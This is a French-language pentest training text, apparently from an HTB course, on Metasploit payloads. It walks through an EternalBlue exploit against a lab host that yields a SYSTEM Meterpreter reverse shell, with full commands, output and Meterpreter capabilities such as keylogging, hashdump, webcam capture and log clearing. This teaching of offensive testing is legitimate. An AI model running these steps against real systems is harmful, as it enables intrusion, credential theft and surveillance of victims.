[[Metasploitable HTB]]

Une charge utile à étages est, en termes simples, un `processus d'exploitation` qui est modularisé et fonctionnellement séparé pour aider à ségréguer les différentes fonctions qu'il accomplit en différents blocs de code, chacun complétant son objectif individuellement mais travaillant à enchaîner l'attaque. Cela accordera finalement à un attaquant un accès à distance à la machine cible si tous les étages fonctionnent correctement.

L'objectif de cette charge utile, comme pour toute autre, en plus d'accorder un accès shell au système cible, est d'être aussi compacte et discrète que possible pour aider autant que possible à l'évasion de l'Antivirus (`AV`) / Système de Prévention d'Intrusion (`IPS`).

Le `Stage0` d'une charge utile à étages représente le shellcode initial envoyé sur le réseau au service vulnérable de la machine cible, qui a pour seul but d'initialiser une connexion retour vers la machine de l'attaquant. C'est ce qu'on appelle une connexion inversée. En tant qu'utilisateur de Metasploit, nous les rencontrerons sous les noms communs `reverse_tcp`, `reverse_https`, et `bind_tcp`. Par exemple, avec la commande `show payloads`, vous pouvez rechercher les charges utiles qui ressemblent à ce qui suit :

#### MSF - Charges utiles à étages

        shellsession
`msf6 > show payloads  <SNIP>  535  windows/x64/meterpreter/bind_ipv6_tcp                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager 536  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support 537  windows/x64/meterpreter/bind_named_pipe                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager 538  windows/x64/meterpreter/bind_tcp                                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager 539  windows/x64/meterpreter/bind_tcp_rc4                                 normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm) 540  windows/x64/meterpreter/bind_tcp_uuid                                normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64) 541  windows/x64/meterpreter/reverse_http                                 normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet) 542  windows/x64/meterpreter/reverse_https                                normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet) 543  windows/x64/meterpreter/reverse_named_pipe                           normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager 544  windows/x64/meterpreter/reverse_tcp                                  normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager 545  windows/x64/meterpreter/reverse_tcp_rc4                              normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm) 546  windows/x64/meterpreter/reverse_tcp_uuid                             normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64) 547  windows/x64/meterpreter/reverse_winhttp                              normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp) 548  windows/x64/meterpreter/reverse_winhttps                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)  <SNIP>`

Les connexions inversées sont souvent plus efficaces car elles tirent parti des règles de trafic sortant. Puisque la victime initie la connexion, elle contourne le filtrage entrant plus strict généralement appliqué par les pare-feux et autres dispositifs de sécurité. Cette approche profite de la confiance généralement accordée au trafic sortant, qui la plupart du temps réside dans ce qu'on appelle une `zone de confiance de sécurité (security trust zone)`. Cependant, bien sûr, cette politique de confiance n'est pas suivie aveuglément par les dispositifs de sécurité et le personnel d'un réseau, donc l'attaquant doit procéder avec prudence même à cette étape.

Le code du Stage0 vise également à lire une charge utile ultérieure plus grande en mémoire une fois qu'elle arrive. Une fois le canal de communication stable établi entre l'attaquant et la victime, la machine de l'attaquant enverra très probablement un étage de charge utile encore plus grand qui devrait lui accorder un accès shell. Cette charge utile plus grande serait la charge utile `Stage1`. Nous entrerons dans les détails dans les sections suivantes.

#### Charge utile Meterpreter

La charge utile `Meterpreter` est un type spécifique de charge utile multifacette qui utilise l'injection de DLL (`DLL injection`) pour s'assurer que la connexion à l'hôte victime est stable, difficile à détecter par de simples vérifications, et persistante après les redémarrages ou les changements de système. Meterpreter réside entièrement dans la mémoire de l'hôte distant et ne laisse aucune trace sur le disque dur, ce qui le rend très difficile à détecter avec les techniques d'investigation numérique (forensic) conventionnelles. De plus, les scripts et les plugins peuvent être `chargés et déchargés` dynamiquement selon les besoins.

Une fois la charge utile Meterpreter exécutée, une nouvelle session est créée, ce qui fait apparaître l'interface Meterpreter. Elle est très similaire à l'interface de msfconsole, mais toutes les commandes disponibles sont destinées au système cible que la charge utile a « infecté ». Elle nous offre une pléthore de commandes utiles, allant de la capture de frappes au clavier, la collecte de hachages de mots de passe, l'écoute du microphone et la prise de captures d'écran, jusqu'à l'usurpation des jetons de sécurité de processus. Nous approfondirons Meterpreter dans une section ultérieure.

En utilisant Meterpreter, nous pouvons également `charger` différents Plugins pour nous aider dans notre évaluation. Nous en parlerons davantage dans la section Plugins de ce module.

---

## Recherche de charges utiles

Pour sélectionner notre première charge utile, nous devons savoir ce que nous voulons faire sur la machine cible. Par exemple, si nous visons la persistance de l'accès, nous voudrons probablement sélectionner une charge utile Meterpreter.

Comme mentionné ci-dessus, les charges utiles Meterpreter nous offrent une flexibilité considérable. Leurs fonctionnalités de base sont déjà vastes et puissantes. Combinées à des plugins tels que le [Plugin Mimikatz de GentilKiwi](https://github.com/gentilkiwi/mimikatz), nous pouvons automatiser et livrer rapidement des parties du pentest tout en gardant une évaluation organisée et efficace en termes de temps. Pour voir toutes les charges utiles disponibles, utilisez la commande `show payloads` dans `msfconsole`.

#### MSF - Lister les charges utiles

        shellsession
`msf6 > show payloads  Payloads ========     #    Name                                                Disclosure Date  Rank    Check  Description -    ----                                                ---------------  ----    -----  -----------    0    aix/ppc/shell_bind_tcp                                               manual  No     AIX Command Shell, Bind TCP Inline    1    aix/ppc/shell_find_port                                              manual  No     AIX Command Shell, Find Port Inline    2    aix/ppc/shell_interact                                               manual  No     AIX execve Shell for inetd    3    aix/ppc/shell_reverse_tcp                                            manual  No     AIX Command Shell, Reverse TCP Inline    4    android/meterpreter/reverse_http                                     manual  No     Android Meterpreter, Android Reverse HTTP Stager    5    android/meterpreter/reverse_https                                    manual  No     Android Meterpreter, Android Reverse HTTPS Stager    6    android/meterpreter/reverse_tcp                                      manual  No     Android Meterpreter, Android Reverse TCP Stager    7    android/meterpreter_reverse_http                                     manual  No     Android Meterpreter Shell, Reverse HTTP Inline    8    android/meterpreter_reverse_https                                    manual  No     Android Meterpreter Shell, Reverse HTTPS Inline    9    android/meterpreter_reverse_tcp                                      manual  No     Android Meterpreter Shell, Reverse TCP Inline    10   android/shell/reverse_http                                           manual  No     Command Shell, Android Reverse HTTP Stager    11   android/shell/reverse_https                                          manual  No     Command Shell, Android Reverse HTTPS Stager    12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager    13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline     <SNIP>        557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager    558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)    559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)    560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)    561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)`

Comme on le voit ci-dessus, il y a beaucoup de charges utiles disponibles. De plus, nous pouvons créer nos propres charges utiles en utilisant `msfvenom`, mais nous y reviendrons un peu plus tard. Nous utiliserons la même cible qu'auparavant, et au lieu d'utiliser la charge utile par défaut, qui est un simple `reverse_tcp_shell`, nous utiliserons une `Charge utile Meterpreter pour Windows 7(x64)`.

En parcourant la liste ci-dessus, nous trouvons la section contenant les `Charges utiles Meterpreter pour Windows(x64)`.

        shellsession
   `515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager    516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support    517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager    518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager    519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)    520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)    521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)    522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)    523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager    524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager    525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)    526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)    527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)    528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)    529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)    530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)    531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)    532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)    533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)    534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64`

Comme nous pouvons le constater, trouver la charge utile souhaitée peut prendre beaucoup de temps avec une liste aussi longue. Nous pouvons également utiliser `grep` dans `msfconsole` pour filtrer des termes spécifiques. Cela accélérerait la recherche et, par conséquent, notre sélection.

Nous devons entrer la commande `grep` avec le paramètre correspondant au début, puis la commande dans laquelle le filtrage doit avoir lieu. Par exemple, supposons que nous voulons un `reverse shell` basé sur `TCP` géré par `Meterpreter` pour notre exploit. En conséquence, nous pouvons d'abord rechercher tous les résultats qui contiennent le mot `Meterpreter` dans les charges utiles.

#### MSF - Recherche d'une charge utile spécifique

        shellsession
`msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter show payloads     6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager    7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support    8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager    9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager    10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)    11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)    12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)    13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)    14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager    15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager    16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)    17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)    18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)    19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)   msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter show payloads  [*] 14`

Cela nous donne un total de `14` résultats. Maintenant, nous pouvons ajouter une autre commande `grep` après la première et rechercher `reverse_tcp`.

        shellsession
`msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads     15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager    16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)    17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)         msf6 exploit(windows/smb/ms17_010_eternalblue) > grep -c meterpreter grep reverse_tcp show payloads  [*] 3`

Avec l'aide de `grep`, nous avons réduit la liste des charges utiles que nous voulions. Bien sûr, la commande `grep` peut être utilisée pour toutes les autres commandes. Tout ce que nous devons savoir, c'est ce que nous cherchons.

---

## Sélection des charges utiles

Comme pour le module, nous avons besoin du numéro d'index de l'entrée que nous souhaitons utiliser. Pour définir la charge utile du module actuellement sélectionné, nous utilisons `set payload <no.>` seulement après avoir sélectionné un module d'Exploit pour commencer.

#### MSF - Sélectionner la charge utile

        shellsession
`msf6 exploit(windows/smb/ms17_010_eternalblue) > show options  Module options (exploit/windows/smb/ms17_010_eternalblue):     Name           Current Setting  Required  Description    ----           ---------------  --------  -----------    RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT          445              yes       The target port (TCP)    SMBDomain      .                no        (Optional) The Windows domain to use for authentication    SMBPass                         no        (Optional) The password for the specified username    SMBUser                         no        (Optional) The username to authenticate as    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.   Exploit target:     Id  Name    --  ----    0   Windows 7 and Server 2008 R2 (x64) All Service Packs    msf6 exploit(windows/smb/ms17_010_eternalblue) > grep meterpreter grep reverse_tcp show payloads     15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager    16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)    17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)   msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15  payload => windows/x64/meterpreter/reverse_tcp`

Après avoir sélectionné une charge utile, nous aurons plus d'options à notre disposition.

        shellsession
`msf6 exploit(windows/smb/ms17_010_eternalblue) > show options  Module options (exploit/windows/smb/ms17_010_eternalblue):     Name           Current Setting  Required  Description    ----           ---------------  --------  -----------    RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT          445              yes       The target port (TCP)    SMBDomain      .                no        (Optional) The Windows domain to use for authentication    SMBPass                         no        (Optional) The password for the specified username    SMBUser                         no        (Optional) The username to authenticate as    VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.    VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.   Payload options (windows/x64/meterpreter/reverse_tcp):     Name      Current Setting  Required  Description    ----      ---------------  --------  -----------    EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)    LHOST                      yes       The listen address (an interface may be specified)    LPORT     4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Windows 7 and Server 2008 R2 (x64) All Service Packs`

Comme nous pouvons le voir, en exécutant la commande `show payloads` au sein même du module Exploit, msfconsole a détecté que la cible est une machine Windows, et n'a donc affiché que les charges utiles destinées aux systèmes d'exploitation Windows.

Nous pouvons également voir qu'un nouveau champ d'options est apparu, directement lié à ce que contiendront les paramètres de la charge utile. Nous nous concentrerons sur `LHOST` et `LPORT` (l'IP de notre attaquant et le port souhaité pour l'initialisation de la connexion inversée). Bien sûr, si l'attaque échoue, nous pouvons toujours utiliser un port différent et relancer l'attaque.

---

## Utilisation des charges utiles

Il est temps de définir nos paramètres pour le module d'Exploit et le module de charge utile. Pour la partie Exploit, nous devrons définir ce qui suit :

|**Paramètre**|**Description**|
|---|---|
|`RHOSTS`|L'adresse IP de l'hôte distant, la machine cible.|
|`RPORT`|Ne nécessite pas de changement, juste une vérification que nous sommes sur le port 445, où SMB est en cours d'exécution.|

Pour la partie charge utile, nous devrons définir ce qui suit :

|**Paramètre**|**Description**|
|---|---|
|`LHOST`|L'adresse IP de l'hôte, la machine de l'attaquant.|
|`LPORT`|Ne nécessite pas de changement, juste une vérification que le port n'est pas déjà utilisé.|

Si nous voulons vérifier rapidement notre adresse IP LHOST, nous pouvons toujours appeler la commande `ifconfig` directement depuis le menu de msfconsole.

#### MSF - Configuration de l'exploit et de la charge utile

        shellsession
`msf6 exploit(**windows/smb/ms17_010_eternalblue**) > ifconfig  **[\*]** exec: ifconfig  tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500  <SNIP>  inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15  <SNIP>   msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.15  LHOST => 10.10.14.15   msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.40  RHOSTS => 10.10.10.40`

Ensuite, nous pouvons lancer l'exploit et voir ce qu'il retourne. Observez les différences dans la sortie ci-dessous :

        shellsession
`msf6 exploit(windows/smb/ms17_010_eternalblue) > run  [*] Started reverse TCP handler on 10.10.14.15:4444  [*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check [+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit) [*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete) [*] 10.10.10.40:445 - Connecting to target for exploitation. [+] 10.10.10.40:445 - Connection established for exploitation. [+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply [*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes) [*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes [*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv [*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1       [+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply [*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations. [*] 10.10.10.40:445 - Sending all but last fragment of exploit packet [*] 10.10.10.40:445 - Starting non-paged pool grooming [+] 10.10.10.40:445 - Sending SMBv2 buffers [+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer. [*] 10.10.10.40:445 - Sending final SMBv2 buffers. [*] 10.10.10.40:445 - Sending last fragment of exploit packet! [*] 10.10.10.40:445 - Receiving response from exploit packet [+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)! [*] 10.10.10.40:445 - Sending egg to corrupted connection. [*] 10.10.10.40:445 - Triggering free of corrupted buffer. [*] Sending stage (201283 bytes) to 10.10.10.40 [*] Meterpreter session 1 opened (10.10.14.15:4444 -> 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000 [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= [+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=   meterpreter > whoami  [-] Unknown command: whoami.   meterpreter > getuid  Server username: NT AUTHORITY\SYSTEM`

L'invite n'est pas une invite de ligne de commande Windows, mais une invite `Meterpreter`. La commande `whoami`, généralement utilisée pour Windows, ne fonctionne pas ici. À la place, nous pouvons utiliser l'équivalent Linux `getuid`. L'exploration du menu `help` nous donne un aperçu plus approfondi de ce dont les charges utiles Meterpreter sont capables.

#### MSF - Commandes Meterpreter

        shellsession
`meterpreter > help  Core Commands =============      Command                   Description     -------                   -----------     ?                         Help menu     background                Backgrounds the current session     bg                        Alias for background     bgkill                    Kills a background meterpreter script     bglist                    Lists running background scripts     bgrun                     Executes a meterpreter script as a background thread     channel                   Displays information or control active channels     close                     Closes a channel     disable_unicode_encoding  Disables encoding of Unicode strings     enable_unicode_encoding   Enables encoding of Unicode strings     exit                      Terminate the meterpreter session     get_timeouts              Get the current session timeout values     guid                      Get the session GUID     help                      Help menu     info                      Displays information about a Post module     IRB                       Open an interactive Ruby shell on the current session     load                      Load one or more meterpreter extensions     machine_id                Get the MSF ID of the machine attached to the session     migrate                   Migrate the server to another process     pivot                     Manage pivot listeners     pry                       Open the Pry debugger on the current session     quit                      Terminate the meterpreter session     read                      Reads data from a channel     resource                  Run the commands stored in a file     run                       Executes a meterpreter script or Post module     secure                    (Re)Negotiate TLV packet encryption on the session     sessions                  Quickly switch to another session     set_timeouts              Set the current session timeout values     sleep                     Force Meterpreter to go quiet, then re-establish session.     transport                 Change the current transport mechanism     use                       Deprecated alias for "load"     uuid                      Get the UUID for the current session     write                     Writes data to a channel   Strap: File system Commands ============================      Command       Description     -------       -----------     cat           Read the contents of a file to the screen     cd            Change directory     checksum      Retrieve the checksum of a file     cp            Copy source to destination     dir           List files (alias for ls)     download      Download a file or directory     edit          Edit a file     getlwd        Print local working directory     getwd         Print working directory     LCD           Change local working directory     lls           List local files     lpwd          Print local working directory     ls            List files     mkdir         Make directory     mv            Move source to destination     PWD           Print working directory     rm            Delete the specified file     rmdir         Remove directory     search        Search for files     show_mount    List all mount points/logical drives     upload        Upload a file or directory   Strap: Networking Commands ===========================      Command       Description     -------       -----------     arp           Display the host ARP cache     get proxy      Display the current proxy configuration     ifconfig      Display interfaces     ipconfig      Display interfaces     netstat       Display the network connections     portfwd       Forward a local port to a remote service     resolve       Resolve a set of hostnames on the target     route         View and modify the routing table   Strap: System Commands =======================      Command       Description     -------       -----------     clearev       Clear the event log     drop_token    Relinquishes any active impersonation token.     execute       Execute a command     getenv        Get one or more environment variable values     getpid        Get the current process identifier     getprivs      Attempt to enable all privileges available to the current process     getsid        Get the SID of the user that the server is running as     getuid        Get the user that the server is running as     kill          Terminate a process     localtime     Displays the target system's local date and time     pgrep         Filter processes by name     pkill         Terminate processes by name     ps            List running processes     reboot        Reboots the remote computer     reg           Modify and interact with the remote registry     rev2self      Calls RevertToSelf() on the remote machine     shell         Drop into a system command shell     shutdown      Shuts down the remote computer     steal_token   Attempts to steal an impersonation token from the target process     suspend       Suspends or resumes a list of processes     sysinfo       Gets information about the remote system, such as OS   Strap: User interface Commands ===============================      Command        Description     -------        -----------     enumdesktops   List all accessible desktops and window stations     getdesktop     Get the current meterpreter desktop     idle time       Returns the number of seconds the remote user has been idle     keyboard_send  Send keystrokes     keyevent       Send key events     keyscan_dump   Dump the keystroke buffer     keyscan_start  Start capturing keystrokes     keyscan_stop   Stop capturing keystrokes     mouse          Send mouse events     screenshare    Watch the remote user's desktop in real-time     screenshot     Grab a screenshot of the interactive desktop     setdesktop     Change the meterpreters current desktop     uictl          Control some of the user interface components   Stdapi: Webcam Commands =======================      Command        Description     -------        -----------     record_mic     Record audio from the default microphone for X seconds     webcam_chat    Start a video chat     webcam_list    List webcams     webcam_snap    Take a snapshot from the specified webcam     webcam_stream  Play a video stream from the specified webcam   Strap: Audio Output Commands =============================      Command       Description     -------       -----------     play          play a waveform audio file (.wav) on the target system   Priv: Elevate Commands ======================      Command       Description     -------       -----------     get system     Attempt to elevate your privilege to that of the local system.   Priv: Password database Commands ================================      Command       Description     -------       -----------     hashdump      Dumps the contents of the SAM database   Priv: Timestamp Commands ========================      Command       Description     -------       -----------     timestamp     Manipulate file MACE attributes`

Plutôt astucieux. De l'extraction des hachages d'utilisateurs du SAM à la prise de captures d'écran et à l'activation des webcams. Tout cela se fait depuis le confort d'une ligne de commande de style Linux. En explorant davantage, nous voyons également l'option d'ouvrir un canal shell. Cela nous placera dans la véritable interface de ligne de commande Windows.

#### MSF - Navigation Meterpreter

        shellsession
`meterpreter > cd Users meterpreter > ls  Listing: C:\Users =================  Mode              Size  Type  Last modified              Name ----              ----  ----  -------------              ---- 40777/rwxrwxrwx   8192  dir   2017-07-21 06:56:23 +0000  Administrator 40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  All Users 40555/r-xr-xr-x   8192  dir   2009-07-14 03:20:08 +0000  Default 40777/rwxrwxrwx   0     dir   2009-07-14 05:08:56 +0000  Default User 40555/r-xr-xr-x   4096  dir   2009-07-14 03:20:08 +0000  Public 100666/rw-rw-rw-  174   fil   2009-07-14 04:54:24 +0000  desktop.ini 40777/rwxrwxrwx   8192  dir   2017-07-14 13:45:33 +0000  haris   meterpreter > shell  Process 2664 created. Channel 1 created.  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved.  C:\Users>`

`Channel 1` a été créé, et nous sommes automatiquement placés dans l'interface en ligne de commande (CLI) pour cette machine. Le canal représente ici la connexion entre notre appareil et l'hôte cible, qui a été établie dans une connexion TCP inversée (de l'hôte cible vers nous) en utilisant un Stager et un Stage Meterpreter. Le stager a été activé sur notre machine pour attendre une demande de connexion initiée par la charge utile Stage sur la machine cible.

Passer à un shell standard sur la cible est utile dans certains cas, mais Meterpreter peut également naviguer et effectuer des actions sur la machine victime. Nous voyons donc que les commandes ont changé, mais nous avons le même niveau de privilège au sein du système.

#### MSF - CMD Windows

        shellsession
`Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved.  C:\Users>dir  dir  Volume in drive C has no label.  Volume Serial Number is A0EF-1911   Directory of C:\Users  21/07/2017  07:56    <DIR>          . 21/07/2017  07:56    <DIR>          .. 21/07/2017  07:56    <DIR>          Administrator 14/07/2017  14:45    <DIR>          haris 12/04/2011  08:51    <DIR>          Public                0 File(s)              0 bytes                5 Dir(s)  15,738,978,304 bytes free  C:\Users>whoami  whoami nt authority\system`

Voyons quels autres types de charges utiles nous pouvons utiliser. Nous examinerons les plus courantes liées aux systèmes d'exploitation Windows.

---

## Types de charges utiles

Le tableau ci-dessous contient les charges utiles les plus courantes utilisées pour les machines Windows et leurs descriptions respectives.

|**Charge utile**|**Description**|
|---|---|
|`generic/custom`|Écouteur générique, multi-usage|
|`generic/shell_bind_tcp`|Écouteur générique, multi-usage, shell normal, liaison de connexion TCP (bind)|
|`generic/shell_reverse_tcp`|Écouteur générique, multi-usage, shell normal, connexion TCP inversée|
|`windows/x64/exec`|Exécute une commande arbitraire (Windows x64)|
|`windows/x64/loadlibrary`|Charge un chemin de bibliothèque x64 arbitraire|
|`windows/x64/messagebox`|Affiche une boîte de dialogue via MessageBox avec un titre, un texte et une icône personnalisables|
|`windows/x64/shell_reverse_tcp`|Shell normal, charge utile unique, connexion TCP inversée|
|`windows/x64/shell/reverse_tcp`|Shell normal, stager + stage, connexion TCP inversée|
|`windows/x64/shell/bind_ipv6_tcp`|Shell normal, stager + stage, stager de liaison TCP IPv6 (bind)|
|`windows/x64/meterpreter/$`|Charge utile Meterpreter + variétés ci-dessus|
|`windows/x64/powershell/$`|Sessions PowerShell interactives + variétés ci-dessus|
|`windows/x64/vncinject/$`|Serveur VNC (Injection Réflective) + variétés ci-dessus|

